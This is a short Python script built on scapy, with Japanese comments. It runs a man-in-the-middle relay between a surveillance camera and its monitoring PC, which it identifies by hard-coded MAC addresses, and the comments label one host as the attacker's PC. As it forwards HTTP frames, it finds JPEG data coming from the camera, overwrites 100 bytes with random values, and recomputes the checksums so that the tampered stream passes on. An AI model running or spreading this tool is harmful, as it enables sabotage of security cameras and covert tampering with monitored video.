import random
from scapy.all import *

TCP.payload_guess = [] #ポート 1723,2000を特別扱いしない

IF = "イーサネット"

mac0 = "a0:ce:c8:a4:eb:d5" #攻撃者PCのMAC設定
mac1 = "08:00:23:9c:31:ff" # 監視カメラのMAC
mac2 = "d0:bf:9c:e2:25:2d" # 監視PCのMAC

FILT = "tcp port 80 and ether dst " + mac0

def maeta(frame):
    if frame[Ether].src == mac1:
        if frame.getlayer(TCP) and frame.getlayer(Raw):
            payload = frame[Raw].load
            # JPEGの開始マーカー 0xFFD8 の位置を探す
            start_index = payload.find(b'\xff\xd8')
            if start_index != -1:
                # 0xFFD8から十分なデータがあるか確認
                if start_index + 110 <= len(payload):  # 10バイトオフセット + 100バイトデータ
                    modify_start = start_index + 10
                    modify_end = modify_start + 100
                    # 10バイト先から100バイト分のデータをランダムに書き換える
                    modified_section = bytearray(payload[modify_start:modify_end])
                    for i in range(len(modified_section)):
                        modified_section[i] = random.randint(0, 255)
                    # 書き換えたデータを元のペイロードに戻す
                    modified_payload = (
                        payload[:modify_start] +
                        bytes(modified_section) +
                        payload[modify_end:]
                    )
                    frame[Raw].load = modified_payload
                    # パケットを再計算して整合性を保つ
                    frame[TCP].chksum = None
                    frame.show2()
        elif frame[Ether].src == mac2:
            frame[Ether].dst = mac1
        else:
            return
        frame[Ether].dst = mac2
    elif frame[Ether].src == mac2:
        frame[Ether].dst = mac1
    else:
        return

    frame[Ether].src = mac0
    sendp(frame, iface=IF)

conf.verb = False
sniff(iface=IF, filter=FILT, store=0, prn=maeta)
